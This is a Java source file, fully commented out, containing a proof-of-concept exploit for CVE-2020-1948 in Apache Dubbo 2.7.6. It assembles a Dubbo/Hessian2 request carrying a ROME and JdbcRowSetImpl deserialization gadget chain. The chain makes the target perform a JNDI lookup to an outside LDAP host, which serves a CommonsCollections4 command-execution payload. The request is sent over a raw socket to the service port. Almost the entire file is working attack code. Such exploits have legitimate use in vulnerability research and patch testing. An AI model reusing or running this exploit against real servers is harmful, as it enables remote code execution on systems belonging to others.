//package dubbo.cve;
//
//import com.rometools.rome.feed.impl.EqualsBean;
//import com.rometools.rome.feed.impl.ToStringBean;
//import com.sun.rowset.JdbcRowSetImpl;
//import org.apache.dubbo.common.io.Bytes;
//import org.apache.dubbo.common.serialize.Cleanable;
//import org.apache.dubbo.serialize.hessian.Hessian2ObjectOutput;
//import ysoserial.payloads.util.Gadgets;
//import ysoserial.payloads.util.Reflections;
//
//import java.io.ByteArrayOutputStream;
//import java.io.OutputStream;
//import java.net.Socket;
//import java.util.HashMap;
//import java.util.Random;
//
//
///**
// * 测试版本：dubbo v2.7.6
// * 修复版本：dubbo v2.7.7
// */
//public class CVE_2020_1948 {
//
//    static String dubbo_ip = "127.0.0.1";
//    static int dubbo_port = 20880;
//    static String ldapUri = "ldap://10.72.176.141:1389/xxWbgdQEzW/CommonsCollections4/Exec/eyJjbWQiOiJjYWxjIn0=";
//
//    public static void setPayload(Hessian2ObjectOutput hessian2ObjectOutput, String jndiUrl) throws Exception {
//
//        JdbcRowSetImpl rs = new JdbcRowSetImpl();
//        rs.setDataSourceName(jndiUrl);
//        rs.setMatchColumn("foo");
//        Reflections.getField(javax.sql.rowset.BaseRowSet.class, "listeners").set(rs, null);
//
//        ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, rs);
//        EqualsBean root = new EqualsBean(ToStringBean.class, item);
//        HashMap hashMap = Gadgets.makeMap(root, root);
//        hessian2ObjectOutput.writeObject(hashMap);
//    }
//
//
//    public static void main(String[] args) throws Exception{
//
//
//
//        // header.
//        byte[] header = new byte[16];
//        // set magic number.
//        Bytes.short2bytes((short) 0xdabb, header);
//        // set request and serialization flag.
//        header[2] = (byte) ((byte) 0x80 | 2);
//        // set request id.
//        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);
//
//        //bodyBaos
//        ByteArrayOutputStream bodyBaos = new ByteArrayOutputStream();
//        Hessian2ObjectOutput body = new Hessian2ObjectOutput(bodyBaos);
//        body.writeUTF("2.7.6");
//        body.writeUTF("any_path");
//        body.writeUTF("0.0.0");
//        body.writeUTF("any_method");
//        body.writeUTF("Ljava/util/Map;");//使用MapDeserializer
//        setPayload(body,ldapUri);
//        body.writeObject(new HashMap());
//
//        body.flushBuffer();
//        if (body instanceof Cleanable) {
//            ((Cleanable) body).cleanup();
//        }
//
//        Bytes.int2bytes(bodyBaos.size(), header, 12);
//        ByteArrayOutputStream totalBaos = new ByteArrayOutputStream();
//        totalBaos.write(header);
//        totalBaos.write(bodyBaos.toByteArray());
//
//        byte[] bytes = totalBaos.toByteArray();
//
//        Socket socket = new Socket(dubbo_ip, dubbo_port);
//        OutputStream outputStream = socket.getOutputStream();
//        outputStream.write(bytes);
//        outputStream.flush();
//        outputStream.close();
//
//    }
//}
